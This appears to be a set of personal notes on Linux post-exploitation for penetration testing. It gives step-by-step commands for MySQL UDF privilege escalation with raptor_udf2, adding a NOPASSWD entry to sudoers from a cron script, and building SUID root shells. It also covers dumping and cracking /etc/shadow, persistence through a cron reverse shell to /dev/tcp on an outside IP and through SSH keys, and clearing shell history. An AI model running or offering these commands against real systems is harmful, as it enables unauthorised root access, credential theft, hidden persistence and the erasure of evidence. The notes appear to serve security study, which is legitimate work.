
# Tools
``` shell
1) linux-exploit-suggester
2) post/multi/recon/local_exploit_suggester 
	# metasploit post module
3) linpeas
4) linenum 
	# https://github.com/rebootuser/LinEnum'
5) 'another script'
	# https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
```

---
# Service Exploits
## `Example : mysql` 
- MySQL service is running as root and the "root" user for the service does not have a password assigned so we can use this popular [exploit](https://www.exploit-db.com/exploits/1518) .

``` shell

# Change into the /home/user/tools/mysql-udf directory:
`cd /home/user/tools/mysql-udf`
#Compile the raptor_udf2.c exploit code using the following commands:
`gcc -g -c raptor_udf2.c -fPIC   gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc   `

# Connect to the MySQL service as the root user with a blank password:

`mysql -u root`  

# Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:

`use mysql;   
create table foo(line blob);   
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';   
create function do_system returns integer soname 'raptor_udf2.so';`

# Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`

# Exit out of the MySQL shell (type **exit** or **\q** and press **Enter**) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`
```

---
# Using Misconfigured cron jobs
- some linux commands to keep in mind : 
```bash
## for cronjobs ....
- crontab -l 

- find -rnw /usr -e "/home/user/file"  # search file in recursive 
- find / -name '*.sh' # for searching crontab file 

- printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers'            # /usr/local/share/copy.sh 

- sudo -l # to look for what commands user can run / has permission 
```

---

# SUID Binaries
```bash
# by modify SUID binaries

- file 'file' 
- strings 'file'

# find SUID binary then modify it to make root shell
> ex. cp /bin/bash greetings | <any other script>
# then run actual linked binery > ./welcome
```

---
# Linux Credential Dumping

``` shell
 # using metasploit hashdump and unshadow utility 

1) "automated" 
	# METASPLOIT (once exploited)
	- use post/linux/gather/hashdump
		-> set SESSION <NUMBER>
	
	- use auxiliary/analyze/crack_linux
		-> set SHA512 true

2)  "manual"
	# copy passwd; shadow files to local machine or download it (use curl,wget)
	- cat /etc/passwd 
	- cat /etc/shadow 
	
	# merge both files using unshadow
	- unshadow passwd shadow > combined_hashes.txt
	
	# now crack by using john (default wordlists) 
	- john combined_hashes.txt
	       OR
	# by your wordlists 
	- john combined_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---
# Persistence on linux
``` shell
1) using metasploit modules
	# msfconsole
	- search platform:linux persistence  # use suitable post / exploit modules
	
	# via ssh keys
	# automated
	- use  post/linux/manage/sshkey_persistence
	
	# manual
	# just copy private ssh key (~/home/user/.ssh/id_rsa) to host machine
	# or just generate new keys in host machine and keep private key in host machine
	# and transfer public key in compromised machine
	
	# ssh commands to gain shell
	- chmod 0400 ssh_key ; ssh -i ssh_key user@ip
	
2) via cronjobs
	## cronjobs
	
	# * -> minutes (0-59) 
	# * -> hour (0-23)
	# * -> days of months (1-31)
	# * -> month (1-12)
	# * -> days of week (0-7)
	
	- cat /etc/cron* # config files for cronjobs
	
	# setting up reverse shell for persistence
	- echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/4444 0>&1'" > cron
	- crontab -i cron  # add this cron file to cronjob 
	- crontab -l       # list all cronjob setting up 
	
	## now just fire up ncat listener...
```

---
# Clearing Tracks
``` shell 
# just remove .bash_history and other hidden files if required
# store all scripts in /tmp 
- history -c # clear command history
```

---

